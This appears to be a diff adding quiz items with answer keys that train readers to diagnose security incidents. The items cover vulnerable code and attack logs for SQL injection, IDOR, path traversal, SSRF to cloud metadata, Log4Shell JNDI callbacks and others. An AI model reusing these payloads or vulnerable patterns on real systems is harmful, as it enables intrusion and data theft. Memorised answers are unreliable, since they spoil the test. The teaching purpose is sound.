@@ -1,0 +1,958 @@
+[
+  {
+    "id": "sec-sqli-fstring-status-filter",
+    "kind": "find-line",
+    "topic": "security",
+    "difficulty": 1,
+    "alert": {
+      "service": "orders-api",
+      "title": "Bug bounty #4471: other customers' orders visible via search",
+      "severity": "SEV1",
+      "firedAt": "14:22"
+    },
+    "evidence": [
+      {
+        "type": "code",
+        "label": "orders/search.py",
+        "language": "python",
+        "startLine": 38,
+        "lines": [
+          "@bp.get(\"/api/orders/search\")",
+          "@login_required",
+          "def search_orders():",
+          "    customer_id = current_user.customer_id",
+          "    status = request.args.get(\"status\", \"open\")",
+          "    sort = SORT_COLUMNS.get(request.args.get(\"sort\"), \"created_at\")",
+          "    limit = min(int(request.args.get(\"limit\", 50)), 200)",
+          "    sql = (",
+          "        \"SELECT id, total_cents, status, created_at FROM orders \"",
+          "        f\"WHERE customer_id = %s AND status = '{status}' \"",
+          "        f\"ORDER BY {sort} DESC LIMIT %s\"",
+          "    )",
+          "    with db.cursor() as cur:",
+          "        cur.execute(sql, (customer_id, limit))",
+          "        rows = cur.fetchall()",
+          "    return jsonify([serialize_order(r) for r in rows])"
+        ]
+      },
+      {
+        "type": "log",
+        "label": "nginx access log (orders-api)",
+        "lines": [
+          {
+            "ts": "14:03:11",
+            "level": "INFO",
+            "source": "nginx",
+            "text": "GET /api/orders/search?status=shipped&sort=total 200 1840 \"Mozilla/5.0\""
+          },
+          {
+            "ts": "14:05:47",
+            "level": "INFO",
+            "source": "nginx",
+            "text": "GET /api/orders/search?status=open%27%20OR%201%3D1--&limit=200 200 48211 \"curl/8.5.0\""
+          },
+          {
+            "ts": "14:06:02",
+            "level": "INFO",
+            "source": "nginx",
+            "text": "GET /api/orders/search?sort=created_at%3BDROP 200 912 \"curl/8.5.0\""
+          }
+        ]
+      }
+    ],
+    "question": "Tap the line that lets the researcher read every customer's orders.",
+    "answer": {
+      "evidence": 0,
+      "line": 9
+    },
+    "explanation": {
+      "cause": "status is interpolated into the SQL with an f-string instead of bound as a parameter.",
+      "why": "`' OR 1=1--` closes the quote, ORs the customer filter away and comments out the rest, so the query returns all orders. customer_id and limit are bound safely; sort only ever comes from the SORT_COLUMNS allowlist. Fix: `status = %s` and pass status in the params tuple.",
+      "tell": "The sort injection attempt returns a tiny normal response (allowlisted), while the quote-breaking status payload returns 48 KB: only the status value reaches the SQL text."
+    },
+    "source": {
+      "title": "OWASP SQL Injection Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "sec-idor-invoice-missing-owner-filter",
+    "kind": "find-line",
+    "topic": "security",
+    "difficulty": 1,
+    "alert": {
+      "service": "billing-api",
+      "title": "Anomaly: one session fetched 3,812 distinct invoices in 9 min",
+      "severity": "SEV2",
+      "firedAt": "10:41"
+    },
+    "evidence": [
+      {
+        "type": "code",
+        "label": "routes/invoices.ts",
+        "language": "ts",
+        "startLine": 112,
+        "lines": [
+          "router.get(\"/api/invoices/:id\", requireAuth, async (req, res) => {",
+          "  const invoiceId = Number(req.params.id);",
+          "  if (!Number.isSafeInteger(invoiceId) || invoiceId <= 0) {",
+          "    return res.status(400).json({ error: \"invalid_invoice_id\" });",
+          "  }",
+          "  const invoice = await prisma.invoice.findFirst({",
+          "    where: { id: invoiceId, deletedAt: null },",
+          "    include: { lineItems: true, billingAddress: true },",
+          "  });",
+          "  if (!invoice) {",
+          "    return res.status(404).json({ error: \"not_found\" });",
+          "  }",
+          "  res.set(\"Cache-Control\", \"private, no-store\");",
+          "  return res.json(toInvoiceDto(invoice));",
+          "});"
+        ]
+      },
+      {
+        "type": "log",
+        "label": "billing-api requests (session s_9f2c)",
+        "lines": [
+          {
+            "ts": "10:32:04",
+            "level": "INFO",
+            "source": "billing-api",
+            "text": "GET /api/invoices/88213 200 user=u_5521 account=acc_311 dur=21ms"
+          },
+          {
+            "ts": "10:32:04",
+            "level": "INFO",
+            "source": "billing-api",
+            "text": "GET /api/invoices/88214 200 user=u_5521 account=acc_311 dur=19ms"
+          },
+          {
+            "ts": "10:32:05",
+            "level": "INFO",
+            "source": "billing-api",
+            "text": "GET /api/invoices/88215 200 user=u_5521 account=acc_311 dur=22ms"
+          },
+          {
+            "ts": "10:32:05",
+            "level": "INFO",
+            "source": "billing-api",
+            "text": "GET /api/invoices/88216 404 user=u_5521 account=acc_311 dur=8ms"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "invoices 88213–88215",
+        "items": [
+          {
+            "key": "Owning accounts",
+            "value": "acc_904, acc_127, acc_662 (none is acc_311)"
+          },
+          {
+            "key": "Auth",
+            "value": "valid session cookie, not expired"
+          }
+        ]
+      }
+    ],
+    "question": "Tap the line that lets one customer read another's invoice.",
+    "answer": {
+      "evidence": 0,
+      "line": 6
+    },
+    "explanation": {
+      "cause": "The invoice lookup filters by id only, never by the caller's account.",
+      "why": "requireAuth proves who the caller is, not what they may read. Any logged-in user can walk sequential ids and get other accounts' invoices (OWASP's IDOR / broken object level authorization). Fix: add `accountId: req.user.accountId` to the where clause so foreign ids 404 like missing ones.",
+      "tell": "Requests from account acc_311 return 200 for invoices owned by three other accounts, in consecutive id order, and the only 404 is a deleted or nonexistent id."
+    },
+    "source": {
+      "title": "OWASP Insecure Direct Object Reference Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "sec-mass-assignment-role-from-body",
+    "kind": "find-line",
+    "topic": "security",
+    "difficulty": 2,
+    "alert": {
+      "service": "accounts-api",
+      "title": "Audit: user.role changed member→admin with no admin actor",
+      "severity": "SEV1",
+      "firedAt": "03:17"
+    },
+    "evidence": [
+      {
+        "type": "code",
+        "label": "handlers/profile.ts",
+        "language": "ts",
+        "startLine": 9,
+        "lines": [
+          "const ProfilePatch = z.object({",
+          "  displayName: z.string().min(1).max(64).optional(),",
+          "  avatarUrl: z.string().url().optional(),",
+          "  timezone: z.string().max(64).optional(),",
+          "});",
+          "",
+          "export async function updateProfile(req: Request, res: Response) {",
+          "  const userId = req.session.userId;",
+          "  if (!userId) return res.status(401).end();",
+          "",
+          "  const parsed = ProfilePatch.safeParse(req.body);",
+          "  if (!parsed.success) {",
+          "    return res.status(422).json({ errors: parsed.error.flatten() });",
+          "  }",
+          "  const user = await prisma.user.update({",
+          "    where: { id: userId },",
+          "    data: { ...req.body, updatedAt: new Date() },",
+          "    select: { id: true, displayName: true, avatarUrl: true, role: true },",
+          "  });",
+          "  return res.json(user);",
+          "}"
+        ]
+      },
+      {
+        "type": "log",
+        "label": "accounts-api audit",
+        "lines": [
+          {
+            "ts": "03:16:40",
+            "level": "INFO",
+            "source": "accounts-api",
+            "text": "PATCH /api/me 200 user=u_77120 fields=[displayName,timezone]"
+          },
+          {
+            "ts": "03:16:58",
+            "level": "INFO",
+            "source": "accounts-api",
+            "text": "PATCH /api/me 200 user=u_77120 fields=[displayName,role]"
+          },
+          {
+            "ts": "03:16:58",
+            "level": "WARN",
+            "source": "audit",
+            "text": "user.role u_77120 member -> admin actor=u_77120 via=PATCH /api/me"
+          },
+          {
+            "ts": "03:17:22",
+            "level": "INFO",
+            "source": "accounts-api",
+            "text": "GET /admin/users?limit=500 200 user=u_77120"
+          }
+        ]
+      }
+    ],
+    "question": "Tap the line that let a member make themselves admin.",
+    "answer": {
+      "evidence": 0,
+      "line": 16
+    },
+    "explanation": {
+      "cause": "The update spreads raw req.body into Prisma instead of the validated parsed.data.",
+      "why": "Zod objects strip unknown keys, so parsed.data could never contain role — but it is never used. The raw body goes straight to prisma.user.update, and role is a real column, so Prisma accepts it. That is mass assignment. Fix: `data: { ...parsed.data, updatedAt: new Date() }`.",
+      "tell": "Validation passes because extra keys aren't errors, yet the audit shows role written from PATCH /api/me — a field the schema never lists."
+    },
+    "source": {
+      "title": "OWASP Mass Assignment Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "sec-path-traversal-hasprefix-sibling-dir",
+    "kind": "find-line",
+    "topic": "security",
+    "difficulty": 3,
+    "alert": {
+      "service": "reports-svc",
+      "title": "DLP: payroll CSV downloaded by non-HR user via /download",
+      "severity": "SEV1",
+      "firedAt": "16:08"
+    },
+    "evidence": [
+      {
+        "type": "code",
+        "label": "export/download.go",
+        "language": "go",
+        "startLine": 41,
+        "lines": [
+          "func (h *ExportHandler) Download(w http.ResponseWriter, r *http.Request) {",
+          "\tname := r.URL.Query().Get(\"file\")",
+          "\tif name == \"\" {",
+          "\t\thttp.Error(w, \"missing file\", http.StatusBadRequest)",
+          "\t\treturn",
+          "\t}",
+          "\tpath := filepath.Join(h.exportDir, name)",
+          "\tif !strings.HasPrefix(path, h.exportDir) {",
+          "\t\thttp.Error(w, \"forbidden\", http.StatusForbidden)",
+          "\t\treturn",
+          "\t}",
+          "\tf, err := os.Open(path)",
+          "\tif err != nil {",
+          "\t\thttp.NotFound(w, r)",
+          "\t\treturn",
+          "\t}",
+          "\tdefer f.Close()",
+          "\tw.Header().Set(\"Content-Type\", \"text/csv\")",
+          "\tw.Header().Set(\"Content-Disposition\", \"attachment; filename=\"+filepath.Base(path))",
+          "\tio.Copy(w, f)",
+          "}"
+        ]
+      },
+      {
+        "type": "log",
+        "label": "reports-svc access log",
+        "lines": [
+          {
+            "ts": "16:02:13",
+            "level": "INFO",
+            "source": "reports-svc",
+            "text": "GET /download?file=../../etc/passwd 403 user=u_3310"
+          },
+          {
+            "ts": "16:03:40",
+            "level": "INFO",
+            "source": "reports-svc",
+            "text": "GET /download?file=..%2f..%2fetc%2fshadow 403 user=u_3310"
+          },
+          {
+            "ts": "16:06:55",
+            "level": "INFO",
+            "source": "reports-svc",
+            "text": "GET /download?file=../exports-hr/payroll-2026-09.csv 200 user=u_3310"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "reports-svc host",
+        "items": [
+          {
+            "key": "h.exportDir",
+            "value": "/srv/exports"
+          },
+          {
+            "key": "Sibling dirs",
+            "value": "/srv/exports-hr (payroll, HR-only), /srv/exports-tmp"
+          }
+        ]
+      }
+    ],
+    "question": "Tap the line that lets ../exports-hr through.",
+    "answer": {
+      "evidence": 0,
+      "line": 7
+    },
+    "explanation": {
+      "cause": "The containment check is a raw string prefix match with no trailing separator.",
+      "why": "filepath.Join cleans the path to /srv/exports-hr/payroll-2026-09.csv, which still starts with the string \"/srv/exports\". Escapes to /etc fail, so the check looks like it works. Fix: compare against exportDir + string(filepath.Separator), use filepath.Rel, or open via os.Root (Go 1.24+).",
+      "tell": "Traversal to /etc gets 403 but a hop to a directory whose name merely starts with \"exports\" gets 200."
+    },
+    "source": {
+      "title": "OWASP: Path Traversal",
+      "url": "https://owasp.org/www-community/attacks/Path_Traversal"
+    }
+  },
+  {
+    "id": "sec-s3-referer-condition-is-public",
+    "kind": "find-line",
+    "topic": "security",
+    "difficulty": 3,
+    "alert": {
+      "service": "data-exports",
+      "title": "Macie Policy:IAMUser/S3BucketPublic on exports-prod-7f3a",
+      "severity": "SEV2",
+      "firedAt": "09:14"
+    },
+    "evidence": [
+      {
+        "type": "log",
+        "label": "CloudTrail (s3.amazonaws.com), exports-prod-7f3a",
+        "lines": [
+          {
+            "ts": "08:58:20",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "GetBucketPolicyStatus user=AssumedRole/platform-admin/jlee"
+          },
+          {
+            "ts": "09:02:41",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "PutBucketPolicy user=AssumedRole/platform-admin/jlee Deny Principal:* s3:* if aws:SecureTransport=false; Allow Principal:* s3:GetObject if aws:SourceVpce=vpce-0a1b2c3d4e5f60718"
+          },
+          {
+            "ts": "09:05:09",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "PutBucketEncryption user=AssumedRole/platform-admin/jlee SSEAlgorithm=aws:kms"
+          },
+          {
+            "ts": "09:11:33",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "PutBucketPolicy user=AssumedRole/platform-admin/jlee Deny Principal:* s3:* if aws:SecureTransport=false; Allow Principal:* s3:GetObject if aws:Referer like https://portal.example.com/*"
+          },
+          {
+            "ts": "09:12:02",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "PutBucketTagging user=AssumedRole/platform-admin/jlee data-class=confidential"
+          },
+          {
+            "ts": "09:13:48",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "GetBucketPolicyStatus user=AssumedRole/platform-admin/jlee"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "exports-prod-7f3a",
+        "items": [
+          {
+            "key": "Block Public Access",
+            "value": "off at bucket and account (static-site legacy)"
+          },
+          {
+            "key": "Object Ownership",
+            "value": "BucketOwnerEnforced (ACLs disabled)"
+          },
+          {
+            "key": "Ticket",
+            "value": "\"Let portal users download reports directly\""
+          }
+        ]
+      }
+    ],
+    "question": "Tap the call that made the bucket readable by anyone.",
+    "answer": {
+      "evidence": 0,
+      "line": 3
+    },
+    "explanation": {
+      "cause": "A Principal:* GetObject grant conditioned only on aws:Referer — which S3 treats as public.",
+      "why": "S3 calls a policy non-public only if it pins fixed values of keys like aws:SourceVpce, aws:SourceIp or a principal. aws:Referer isn't one: it is a client-supplied header anyone can set. The 09:02 policy was VPC-endpoint-only; the 09:11 rewrite swapped that for Referer. Fix: CloudFront with OAC plus signed URLs.",
+      "tell": "Both policies say Principal:*, but only the second one swaps a fixed aws:SourceVpce for a spoofable aws:Referer, and Macie fires minutes later."
+    },
+    "source": {
+      "title": "AWS: Blocking public access to your Amazon S3 storage — The meaning of \"public\"",
+      "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html#access-control-block-public-access-policy-status"
+    }
+  },
+  {
+    "id": "sec-leaked-iam-key-gpu-mining",
+    "kind": "diagnose",
+    "topic": "security",
+    "difficulty": 1,
+    "alert": {
+      "service": "aws-billing",
+      "title": "Cost anomaly: EC2 spend +1,100% vs baseline, all regions",
+      "severity": "SEV1",
+      "firedAt": "06:30"
+    },
+    "evidence": [
+      {
+        "type": "metric",
+        "label": "EC2 spend, all regions",
+        "unit": "$/h",
+        "points": [
+          41,
+          40,
+          42,
+          41,
+          43,
+          40,
+          41,
+          42,
+          155,
+          268,
+          382,
+          494,
+          495,
+          497,
+          494,
+          496
+        ],
+        "markAt": 8
+      },
+      {
+        "type": "log",
+        "label": "CloudTrail + GuardDuty",
+        "lines": [
+          {
+            "ts": "02:11:07",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "GetCallerIdentity user=IAMUser/ci-deploy key=AKIA4XQ7EXAMPLE5RT2Z src=203.0.113.61"
+          },
+          {
+            "ts": "02:13:52",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "RunInstances region=ap-southeast-1 type=g5.12xlarge count=20 user=IAMUser/ci-deploy key=AKIA4XQ7EXAMPLE5RT2Z"
+          },
+          {
+            "ts": "02:14:30",
+            "level": "INFO",
+            "source": "cloudtrail",
+            "text": "RunInstances region=sa-east-1 type=g5.12xlarge count=20 user=IAMUser/ci-deploy key=AKIA4XQ7EXAMPLE5RT2Z"
+          },
+          {
+            "ts": "02:41:16",
+            "level": "WARN",
+            "source": "guardduty",
+            "text": "CryptoCurrency:EC2/BitcoinTool.B!DNS i-0c81f3e2a9d4b7710 (ap-southeast-1)"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "Context",
+        "items": [
+          {
+            "key": "Regions in use",
+            "value": "us-east-1, eu-west-1 only"
+          },
+          {
+            "key": "GPU instances running",
+            "value": "80 × g5.12xlarge across 4 unused regions"
+          },
+          {
+            "key": "ci-deploy key age",
+            "value": "731 days, never rotated"
+          },
+          {
+            "key": "Public repo push 01:48",
+            "value": "deploy/.env.example — contains AWS_ACCESS_KEY_ID=AKIA4XQ7…"
+          }
+        ]
+      }
+    ],
+    "question": "What is burning the EC2 budget?",
+    "options": [
+      "Long-lived IAM user key leaked publicly, used to mine crypto",
+      "Instance role credentials stolen from a web host via SSRF",
+      "Autoscaling policy misfire launching GPU nodes in DR regions",
+      "Compromised root console session launching fleet instances"
+    ],
+    "answer": 0,
+    "explanation": {
+      "cause": "The ci-deploy access key, pushed to a public repo, was used to launch GPU miners.",
+      "why": "AKIA keys are long-term IAM user keys; stolen instance-role creds would be ASIA keys under an assumed role. Calls come from an outside IP minutes after the push, start with GetCallerIdentity, and hit regions you don't use. Deactivate the key, then terminate instances in every region and review IAM changes.",
+      "tell": "RunInstances is signed by IAMUser/ci-deploy's AKIA key from an external IP, 25 minutes after that key landed in a public commit."
+    },
+    "source": {
+      "title": "AWS GuardDuty: Remediating potentially compromised AWS credentials",
+      "url": "https://docs.aws.amazon.com/guardduty/latest/ug/compromised-creds.html"
+    }
+  },
+  {
+    "id": "sec-ssrf-redirect-to-imds-credentials",
+    "kind": "diagnose",
+    "topic": "security",
+    "difficulty": 2,
+    "alert": {
+      "service": "link-preview",
+      "title": "GuardDuty: InstanceCredentialExfiltration.OutsideAWS (High)",
+      "severity": "SEV1",
+      "firedAt": "21:52"
+    },
+    "evidence": [
+      {
+        "type": "log",
+        "label": "link-preview worker + GuardDuty",
+        "lines": [
+          {
+            "ts": "21:47:10",
+            "level": "WARN",
+            "source": "link-preview",
+            "text": "blocked url=http://169.254.169.254/latest/meta-data/ reason=denylisted_host"
+          },
+          {
+            "ts": "21:47:31",
+            "level": "WARN",
+            "source": "link-preview",
+            "text": "blocked url=http://[::ffff:a9fe:a9fe]/latest/meta-data/ reason=invalid_host"
+          },
+          {
+            "ts": "21:48:02",
+            "level": "INFO",
+            "source": "link-preview",
+            "text": "fetch url=https://img.cdn-assets.example/p.png status=302 location=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          },
+          {
+            "ts": "21:48:02",
+            "level": "INFO",
+            "source": "link-preview",
+            "text": "fetch (redirect 1) status=200 bytes=19 content-type=text/plain"
+          },
+          {
+            "ts": "21:48:40",
+            "level": "INFO",
+            "source": "link-preview",
+            "text": "fetch url=https://img.cdn-assets.example/q.png status=302 location=http://169.254.169.254/latest/meta-data/iam/security-credentials/preview-worker-role"
+          },
+          {
+            "ts": "21:48:40",
+            "level": "INFO",
+            "source": "link-preview",
+            "text": "fetch (redirect 1) status=200 bytes=1342 content-type=text/plain"
+          },
+          {
+            "ts": "21:51:19",
+            "level": "WARN",
+            "source": "guardduty",
+            "text": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS key=ASIA… role=preview-worker-role api=ListBuckets src=203.0.113.88"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "link-preview config",
+        "items": [
+          {
+            "key": "URL check",
+            "value": "hostname/IP denylist on the submitted URL only"
+          },
+          {
+            "key": "HTTP client",
+            "value": "follows up to 5 redirects"
+          },
+          {
+            "key": "IMDS HttpTokens",
+            "value": "optional"
+          }
+        ]
+      }
+    ],
+    "question": "How did the role credentials leave the instance?",
+    "options": [
+      "DNS rebinding flipped an allowed host to 169.254.169.254",
+      "A dependency in the worker read creds from the environment",
+      "Allowed URL redirected to IMDSv1; client followed unchecked",
+      "IPv6-mapped address slipped past the hostname denylist"
+    ],
+    "answer": 2,
+    "explanation": {
+      "cause": "SSRF: an allowed external URL 302'd to IMDS and the client followed it without rechecking.",
+      "why": "The denylist runs only on the submitted URL, and the client follows redirects. With HttpTokens optional, a plain GET to IMDS returns role creds (IMDSv2 needs a PUT for a token first). Fix: require IMDSv2, recheck every hop, or block link-local in an egress proxy.",
+      "tell": "Direct and IPv6-mapped tries are blocked; the 302 Location points at the IMDS credentials path, and the 1,342-byte reply matches a credential JSON document."
+    },
+    "source": {
+      "title": "OWASP Server-Side Request Forgery Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "sec-credential-stuffing-unknown-users",
+    "kind": "diagnose",
+    "topic": "security",
+    "difficulty": 2,
+    "alert": {
+      "service": "auth-api",
+      "title": "auth-api: login failures 40x baseline, success ratio 0.9%",
+      "severity": "SEV2",
+      "firedAt": "01:20"
+    },
+    "evidence": [
+      {
+        "type": "metric",
+        "label": "POST /login attempts",
+        "unit": "req/min",
+        "points": [
+          310,
+          295,
+          288,
+          301,
+          290,
+          2410,
+          9800,
+          12650,
+          12410,
+          12880,
+          12720,
+          12590,
+          12900,
+          12760
+        ],
+        "markAt": 5
+      },
+      {
+        "type": "log",
+        "label": "auth-api",
+        "lines": [
+          {
+            "ts": "01:18:02.114",
+            "level": "INFO",
+            "source": "auth-api",
+            "text": "login failed email=m***@gmail.com reason=unknown_user ip=91.214.x.x asn=AS9009"
+          },
+          {
+            "ts": "01:18:02.120",
+            "level": "INFO",
+            "source": "auth-api",
+            "text": "login failed email=d***@yahoo.com reason=invalid_password ip=176.59.x.x asn=AS12958"
+          },
+          {
+            "ts": "01:18:02.131",
+            "level": "INFO",
+            "source": "auth-api",
+            "text": "login failed email=t***@outlook.com reason=unknown_user ip=45.140.x.x asn=AS49505"
+          },
+          {
+            "ts": "01:18:02.139",
+            "level": "INFO",
+            "source": "auth-api",
+            "text": "login ok email=r***@gmail.com ip=102.89.x.x asn=AS29465 mfa=not_enrolled"
+          },
+          {
+            "ts": "01:18:02.152",
+            "level": "INFO",
+            "source": "auth-api",
+            "text": "login failed email=k***@gmail.com reason=unknown_user ip=187.19.x.x asn=AS28573"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "Last 60 minutes",
+        "items": [
+          {
+            "key": "Distinct emails tried",
+            "value": "611,204 (attempts per email: median 1)"
+          },
+          {
+            "key": "unknown_user share",
+            "value": "68% of failures"
+          },
+          {
+            "key": "Distinct source IPs",
+            "value": "21,930, mostly residential ASNs"
+          },
+          {
+            "key": "Passwords per email",
+            "value": "1 attempt each, no lockouts triggered"
+          }
+        ]
+      }
+    ],
+    "question": "What kind of attack is this?",
+    "options": [
+      "Password spraying: one common password across real accounts",
+      "Credential stuffing with pairs from another site's breach",
+      "Brute force cycling a wordlist against a few target accounts",
+      "Session store outage forcing users to log in again en masse"
+    ],
+    "answer": 1,
+    "explanation": {
+      "cause": "Credential stuffing: another site's breached pairs, replayed via residential proxies.",
+      "why": "Each email is tried once with one specific password; most emails don't even exist here, which a list built from your own users (spraying) wouldn't show. Brute force hammers few accounts and trips lockouts; an outage would yield mostly known users succeeding. Respond with breached-password checks, MFA and bot defenses.",
+      "tell": "68% of failures are unknown_user, one attempt per email, and ~1% of pairs work — the signature of someone else's breach list, not guessing."
+    },
+    "source": {
+      "title": "OWASP Credential Stuffing Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html"
+    }
+  },
+  {
+    "id": "sec-log4shell-user-agent-jndi-egress",
+    "kind": "diagnose",
+    "topic": "security",
+    "difficulty": 2,
+    "alert": {
+      "service": "catalog-search",
+      "title": "Egress firewall: catalog-search → 198.51.100.9:1389 (new dest)",
+      "severity": "SEV1",
+      "firedAt": "03:15"
+    },
+    "evidence": [
+      {
+        "type": "log",
+        "label": "nginx → catalog-search → egress fw",
+        "lines": [
+          {
+            "ts": "03:14:07",
+            "level": "INFO",
+            "source": "nginx",
+            "text": "203.0.113.7 - - [10/Oct/2026:03:14:07 +0000] \"GET /search?q=boots HTTP/1.1\" 200 512 \"-\" \"${jndi:ldap://198.51.100.9:1389/a}\""
+          },
+          {
+            "ts": "03:14:07.311",
+            "level": "INFO",
+            "source": "catalog-search",
+            "text": "c.s.web.RequestLogger - GET /search q=boots ua=${jndi:ldap://198.51.100.9:1389/a}"
+          },
+          {
+            "ts": "03:14:07.402",
+            "level": "INFO",
+            "source": "egress-fw",
+            "text": "ALLOW tcp 10.0.3.21:48122 -> 198.51.100.9:1389"
+          },
+          {
+            "ts": "03:14:07.689",
+            "level": "INFO",
+            "source": "egress-fw",
+            "text": "ALLOW tcp 10.0.3.21:48130 -> 198.51.100.9:8180"
+          },
+          {
+            "ts": "03:14:09",
+            "level": "INFO",
+            "source": "nginx",
+            "text": "203.0.113.7 - - [10/Oct/2026:03:14:09 +0000] \"GET /search?q=%24%7Bjndi%3Adns%3A%2F%2Fx.oast.example%2Fq%7D HTTP/1.1\" 200 498 \"-\" \"curl/8.5.0\""
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "catalog-search",
+        "items": [
+          {
+            "key": "Logging",
+            "value": "log4j-core 2.14.1 (shaded in an internal SDK)"
+          },
+          {
+            "key": "log4j2.formatMsgNoLookups",
+            "value": "unset"
+          },
+          {
+            "key": "Egress policy",
+            "value": "allow all outbound"
+          }
+        ]
+      }
+    ],
+    "question": "What happened to catalog-search?",
+    "options": [
+      "Internet scanner probing; the JNDI string was only logged",
+      "Logged User-Agent triggered a JNDI lookup to attacker LDAP",
+      "SSRF in /search let the attacker make the app fetch URLs",
+      "Compromised base image beaconing to a command server"
+    ],
+    "answer": 1,
+    "explanation": {
+      "cause": "Log4Shell (CVE-2021-44228): logging the User-Agent made Log4j resolve ${jndi:ldap://…}.",
+      "why": "log4j-core before 2.15.0 performs lookups on logged messages, so a JNDI string in any logged header makes the JVM call the attacker's LDAP server, which can point it at remote code. Isolate the host, treat it as compromised, upgrade log4j-core (2.17.1+), and restrict egress.",
+      "tell": "Under 100 ms after the UA is logged, the app host itself opens TCP to the exact host:port in the payload, then a second port. A probe that only gets logged makes no callback."
+    },
+    "source": {
+      "title": "Apache Log4j Security Vulnerabilities (CVE-2021-44228)",
+      "url": "https://logging.apache.org/security.html"
+    }
+  },
+  {
+    "id": "sec-xz-backdoor-sshd-latency",
+    "kind": "diagnose",
+    "topic": "security",
+    "difficulty": 3,
+    "alert": {
+      "service": "build-runner-04",
+      "title": "build-runner-04: sshd CPU 4x baseline, SSH login p50 +500 ms",
+      "severity": "SEV3",
+      "firedAt": "11:05"
+    },
+    "evidence": [
+      {
+        "type": "metric",
+        "label": "ssh login time (synthetic probe)",
+        "unit": "ms",
+        "points": [
+          301,
+          298,
+          305,
+          299,
+          302,
+          300,
+          297,
+          811,
+          806,
+          809,
+          803,
+          812,
+          807,
+          805
+        ],
+        "markAt": 7
+      },
+      {
+        "type": "log",
+        "label": "build-runner-04 journal",
+        "lines": [
+          {
+            "ts": "02:00:15",
+            "level": "INFO",
+            "source": "systemd",
+            "text": "Stopping ssh.service - OpenBSD Secure Shell server..."
+          },
+          {
+            "ts": "02:00:15",
+            "level": "INFO",
+            "source": "systemd",
+            "text": "Started ssh.service - OpenBSD Secure Shell server."
+          },
+          {
+            "ts": "10:58:03",
+            "level": "INFO",
+            "source": "sshd",
+            "text": "Invalid user admin from 198.51.100.23 port 51122"
+          },
+          {
+            "ts": "10:58:04",
+            "level": "INFO",
+            "source": "sshd",
+            "text": "Invalid user oracle from 198.51.100.23 port 51130"
+          },
+          {
+            "ts": "10:58:09",
+            "level": "INFO",
+            "source": "sshd",
+            "text": "Accepted publickey for ci from 10.8.0.12 port 40188 ssh2: ED25519 SHA256:q7Lw…"
+          }
+        ]
+      },
+      {
+        "type": "facts",
+        "label": "build-runner-04 (Debian sid)",
+        "items": [
+          {
+            "key": "apt 02:00",
+            "value": "liblzma5, xz-utils upgraded to 5.6.1-1"
+          },
+          {
+            "key": "openssh-server",
+            "value": "unchanged for 3 weeks"
+          },
+          {
+            "key": "ldd /usr/sbin/sshd",
+            "value": "libsystemd.so.0 → liblzma.so.5"
+          },
+          {
+            "key": "Bot login attempts",
+            "value": "~40/min, flat for a month"
+          },
+          {
+            "key": "UseDNS",
+            "value": "no"
+          }
+        ]
+      }
+    ],
+    "question": "What is slowing sshd?",
+    "options": [
+      "SSH brute-force bots saturating sshd with failed logins",
+      "Reverse DNS on each connection timing out before auth",
+      "OpenSSH switched to a costlier post-quantum key exchange",
+      "Backdoored liblzma hooking sshd's auth through libsystemd"
+    ],
+    "answer": 3,
+    "explanation": {
+      "cause": "xz/liblzma 5.6.1 carries the CVE-2024-3094 backdoor, loaded into sshd via libsystemd.",
+      "why": "Debian's sshd links libsystemd for service notification, and libsystemd pulls in liblzma. The malicious 5.6.x build patches symbol resolution as sshd starts, adding ~0.5 s to every connection — how Andres Freund found it. Rebuild the host from a known-good image and rotate its SSH and CI secrets.",
+      "tell": "Login time steps from ~300 to ~800 ms the minute the liblzma upgrade restarts ssh, while OpenSSH, UseDNS and bot volume are all unchanged."
+    },
+    "source": {
+      "title": "oss-security: backdoor in upstream xz/liblzma leading to ssh server compromise",
+      "url": "https://www.openwall.com/lists/oss-security/2024/03/29/4"
+    }
+  }
+]
